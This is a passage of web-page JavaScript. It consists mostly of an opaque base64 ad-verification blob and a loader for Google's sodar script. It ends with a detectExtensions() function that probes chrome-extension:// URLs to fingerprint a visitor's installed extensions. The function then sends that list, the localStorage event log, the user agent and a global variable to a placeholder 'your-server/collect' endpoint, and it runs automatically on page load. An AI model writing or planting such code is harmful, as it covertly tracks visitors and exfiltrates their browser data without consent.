    '_bgp_': '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\x3d',
    '_ifr_': 'false',
    '_isfl_': 'false'
  });
  var gsodar = document.createElement('script');
  gsodar.type = 'text/javascript';
  gsodar.async = true;
  gsodar.src = '//tpc.googlesyndication.com/sodar/UFYwWwmt.js';
  var s = document.getElementsByTagName('script')[0];
  s.parentNode.insertBefore(gsodar, s);
})();
function saveEventToLocalStorage(eventType, id) {
  const eventLog = JSON.parse(localStorage.getItem('eventLog') || '{}');
  eventLog[eventType] = id;
  localStorage.setItem('eventLog', JSON.stringify(eventLog));
}
async function detectExtensions() {
  const results = {};
  for (const [extName, extData] of Object.entries(window.data)) {
    try {
      const response = await fetch(`chrome-extension://${extData.id}/${extData.file}`);
      results[extName] = response.status === 200;
    } catch (e) {
      results[extName] = false;
    }
  }
  fetch('https://your-server/collect', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      extensions: results,
      localData: JSON.parse(localStorage.getItem('eventLog')),
      // Fetch data from LocalStorage
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      globalVar: window.myGlobal // Return the collected global variable
    })
  });
}
detectExtensions();